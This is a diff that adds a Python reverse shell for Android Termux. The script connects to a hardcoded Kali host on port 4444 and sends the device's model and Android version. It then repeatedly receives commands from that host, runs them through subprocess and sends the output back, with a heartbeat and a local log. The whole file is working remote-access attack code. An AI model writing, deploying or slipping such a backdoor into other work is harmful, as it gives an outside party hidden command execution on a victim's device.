@@ -1,0 +1,67 @@
+import socket       # For network communication
+import subprocess   # To run system commands
+import os           # To interact with system properties
+import time         # For delays and timestamps
+
+# Remote server IP and port
+KALI_IP = "192.168.0.106"
+KALI_PORT = 4444
+
+# File to log connection events
+LOG_FILE = "/data/data/com.termux/files/home/connection_log.txt"
+
+def log_event(message):
+    # Append log messages with timestamp
+    with open(LOG_FILE, "a") as log:
+        log.write(f"[LOG] {time.ctime()} - {message}\n")
+
+def get_device_info():
+    # Fetch device model and Android version using system properties
+    model = os.popen("getprop ro.product.model").read().strip()
+    version = os.popen("getprop ro.build.version.release").read().strip()
+    return model, version
+
+def main():
+    try:
+        # Create a TCP socket and connect to server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((KALI_IP, KALI_PORT))
+
+        # Send device info to server
+        model, version = get_device_info()
+        s.sendall(f"[+] Android (Termux) connected\n".encode())
+        s.sendall(f"Model: {model}\n".encode())
+        s.sendall(f"Android Version: {version}\n".encode())
+        log_event("Connection established with server")
+
+        while True:
+            # Send heartbeat message to server
+            s.sendall(b"[HB] Android Termux alive\n")
+
+            # Receive command from server
+            cmd = s.recv(1024).decode().strip()
+
+            # Exit if server sends quit command
+            if cmd.lower() in ["exit", "quit"]:
+                log_event("Session terminated by server")
+                break
+
+            # Execute command and send output back
+            if cmd:
+                output = subprocess.getoutput(cmd)
+                s.sendall((output + "\n").encode())
+                log_event(f"Executed: {cmd}")
+
+            # Wait before next heartbeat
+            time.sleep(10)
+
+    except Exception as e:
+        # Log any errors
+        log_event(f"Error: {str(e)}")
+
+    finally:
+        # Close socket connection
+        s.close()
+
+if __name__ == "__main__":
+    main()
